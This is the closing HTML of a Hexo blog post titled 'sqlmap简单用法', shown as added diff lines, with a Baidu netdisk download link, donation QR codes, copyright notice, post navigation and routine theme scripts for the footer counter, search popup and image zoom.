+<p>百度链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12HA0xCzaU2PgtxAALrpFLQ?pwd=ru6w">https://pan.baidu.com/s/12HA0xCzaU2PgtxAALrpFLQ?pwd=ru6w</a><br>提取码：ru6w</p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://s3.bmp.ovh/imgs/2022/03/a495286dcfde6bfa.bmp"><img loading="lazy" src="https://s3.bmp.ovh/imgs/2022/03/a495286dcfde6bfa.bmp" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://s3.bmp.ovh/imgs/2022/03/1018089fdf3cd065.png"><img loading="lazy" src="https://s3.bmp.ovh/imgs/2022/03/1018089fdf3cd065.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://s3.bmp.ovh/imgs/2022/03/08ce21ed009e0f80.png"><img loading="lazy" src="https://s3.bmp.ovh/imgs/2022/03/08ce21ed009e0f80.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>LuRen</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://weaving-dreams.github.io/posts/15042a92/" title="sqlmap简单用法">https://weaving-dreams.github.io/posts/15042a92/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/29ab9ab2/" rel="prev" title="fiddler汉化"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">fiddler汉化</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/50b45d5b/" rel="next" title="AC双热机备份"><span class="post-nav-text">AC双热机备份</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>不要与我交流，我什么都不会。</span><br><a class="hty-button hty-button--raised" id="github-discussions" target="_blank" rel="noopener" href="https://github.com/weaving-dreams/weaving-dreams.github.io/discussions/new">GitHub Discussions</a></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/posts/15042a92/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> LuRen</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.2</span></div><div class="live-time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2022-03-09T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
+}
+blog_live_time();
+</script></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script>function initMourn() {
+  const date = new Date();
+  const today = (date.getMonth() + 1) + "-" + date.getDate()
+  const mourn_days = ["4-4","9-18"]
+  if (mourn_days.includes(today)) {
+    document.documentElement.style.filter = "grayscale(1)";
+  }
+}
+initMourn();</script><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
